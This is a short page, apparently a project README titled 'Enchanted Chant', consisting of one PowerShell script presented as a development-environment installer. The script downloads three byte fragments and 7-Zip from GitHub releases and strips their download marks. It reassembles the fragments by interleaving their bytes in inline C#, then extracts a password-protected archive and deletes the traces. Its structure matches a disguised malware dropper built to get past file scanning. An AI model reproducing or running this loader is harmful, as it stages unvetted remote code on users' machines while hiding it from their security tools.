# Enchanted Chant

```PowerShell
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"
$InstallDirPath = "C:\TempInstall\InstallScript"
$SevenZipExeFilePath = "$InstallDirPath\Lib\7z.exe"
$SevenZipDllFilePath = "$InstallDirPath\Lib\7z.dll"
$ArtifactArchiveFilePath = "$InstallDirPath\init-dev-env.7z"
$File0Path = "$InstallDirPath\data_a3f89.dat"
$File1Path = "$InstallDirPath\pkg_7c18e.dat"
$File2Path = "$InstallDirPath\res_e49c2.dat"
$Pswd = Read-Host -Prompt "Key?"
New-Item -ItemType Directory -Path "$InstallDirPath\Lib" -Force -ErrorAction SilentlyContinue | Out-Null
$wc = New-Object System.Net.WebClient
$wc.DownloadFile("https://raw.githubusercontent.com/init-dev-env/init-dev-env-act/refs/heads/🐷🐷🍒Obsolete-45DF11/lib/7z.exe", "$SevenZipExeFilePath")
$wc.DownloadFile("https://raw.githubusercontent.com/init-dev-env/init-dev-env-act/refs/heads/🐷🐷🍒Obsolete-45DF11/lib/7z.dll", "$SevenZipDllFilePath")
Unblock-File "$SevenZipExeFilePath" | Out-Null
Unblock-File "$SevenZipDllFilePath" | Out-Null
$wc.DownloadFile("https://github.com/init-dev-env/init-dev-env/releases/download/🐷🐷🍒Obsolete-45DF11/data_a3f89.dat", "$File0Path")
$wc.DownloadFile("https://github.com/init-dev-env/init-dev-env-act/releases/download/🐷🐷🍒Obsolete-45DF11/pkg_7c18e.dat", "$File1Path")
$wc.DownloadFile("https://github.com/init-dev-env/init-dev-env-site/releases/download/🐷🐷🍒Obsolete-45DF11/res_e49c2.dat", "$File2Path")
$wc.Dispose()
Unblock-File "$File0Path" | Out-Null; Unblock-File "$File1Path" | Out-Null; Unblock-File "$File2Path" | Out-Null
Add-Type 'public class J{public static void M(string a,string b,string c,string o){byte[]x=System.IO.File.ReadAllBytes(a),y=System.IO.File.ReadAllBytes(b),z=System.IO.File.ReadAllBytes(c),d=new byte[x.Length+y.Length+z.Length];int i0=0,i1=0,i2=0;for(int p=0;p!=d.Length;){if(i0!=x.Length)d[p++]=x[i0++];if(i1!=y.Length)d[p++]=y[i1++];if(i2!=z.Length)d[p++]=z[i2++];}System.IO.File.WriteAllBytes(o,d);}}'
[J]::M("$File0Path","$File1Path","$File2Path","$ArtifactArchiveFilePath")
Remove-Item "$File0Path","$File1Path","$File2Path" -Force -ErrorAction SilentlyContinue | Out-Null
Start-Process "$SevenZipExeFilePath" -ArgumentList "x `"$ArtifactArchiveFilePath`" -o`"$InstallDirPath`" -p$Pswd -x!Lib\7z.exe -x!Lib\7z.dll -y -sccWIN -scsUTF-8 -bso0 -bsp0 -bd" -Wait -NoNewWindow | Out-Null
Start-Process "C:\Windows\Explorer.exe" -ArgumentList "$InstallDirPath"

```

